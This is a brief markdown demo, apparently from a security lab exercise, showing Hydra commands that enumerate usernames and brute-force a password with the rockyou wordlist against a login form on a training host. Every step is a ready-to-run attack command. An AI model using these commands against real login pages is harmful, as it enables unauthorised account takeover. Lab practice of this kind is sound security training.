# Hydra Demo

Username enumeration:
~~~
# hydra -I -L /usr/share/commix/src/txt/usernames.txt -p test glocken.vm.vuln.land http-get-form "/12001/cookie_case0/auth_cookie0/login:username=^USER^&password=^PASS^:Wrong username"
~~~

Decompress password list:
~~~
# gunzip /usr/share/wordlists/rockyou.txt.gz
~~~

Brute force password of user `hacker10`:
~~~
# hydra -I -l hacker10 -P /usr/share/wordlists/rockyou.txt  glocken.vm.vuln.land http-get-form "/12001/cookie_case0/auth_cookie0/login:username=^USER^&password=^PASS^:Forgot password"
~~~
